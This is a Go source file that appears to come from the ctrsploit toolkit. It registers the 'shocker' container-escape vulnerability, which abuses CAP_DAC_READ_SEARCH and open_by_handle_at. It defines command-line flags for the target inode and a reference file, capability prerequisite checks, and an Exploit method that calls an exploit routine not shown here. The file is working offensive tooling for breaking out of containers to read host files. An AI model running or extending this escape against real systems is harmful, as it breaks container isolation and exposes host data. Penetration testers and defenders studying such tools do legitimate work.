package shocker

import (
	"os"

	"github.com/ctrsploit/ctrsploit/prerequisite/capability"
	"github.com/ctrsploit/sploit-spec/pkg/app"
	"github.com/ctrsploit/sploit-spec/pkg/exeenv"
	"github.com/ctrsploit/sploit-spec/pkg/vul"
	"github.com/urfave/cli/v2"
)

var (
	aliases      = []string{"cap_dac_read_search", "open_by_handle_at"}
	flagsExploit = []cli.Flag{
		&cli.IntFlag{
			Name:        "inode",
			DefaultText: "default is 2, (in ext fs, root's inode is 2)",
			Required:    false,
			Value:       2,
		},
		&cli.StringFlag{
			Name:        "reference",
			Aliases:     []string{"r", "ref", "mountFd"},
			DefaultText: "default is /etc/hosts",
			Required:    false,
			Value:       "/etc/hosts",
		},
	}
	ExploitCmd  = app.Vul2ExploitCmd(&Vul, aliases, flagsExploit, true)
	CheckSecCmd = app.Vul2ChecksecCmd(&Vul, aliases, nil)
	VulCmd      = app.Vul2VulCmd(&Vul, aliases, nil, flagsExploit, true)
)

type vulnerability struct {
	vul.BaseVulnerability
}

var Vul = vulnerability{
	BaseVulnerability: vul.BaseVulnerability{
		Name:        "shocker",
		Description: "escape by CAP_DAC_READ_SEARCH, alias shocker, found by Sebastian Krahmer (stealth) in 2014",
		Level:       vul.LevelHigh,
		ExeEnv: exeenv.ExeEnv{
			Env:     exeenv.InContainer,
			Check:   exeenv.InContainer,
			Exploit: exeenv.InContainer,
		},
		CheckSecPrerequisites:    &capability.CapDacReadSearchBnd,
		ExploitablePrerequisites: &capability.CapDacReadSearchEff,
	},
}

func (v *vulnerability) Exploit(context *cli.Context) (err error) {
	err = v.BaseVulnerability.Exploit(context)
	if err != nil {
		return
	}
	inode := context.Int("inode")
	ref := context.String("ref")
	return Exploit(inode, ref, os.Stdin, os.Stdout, os.Stderr)
}
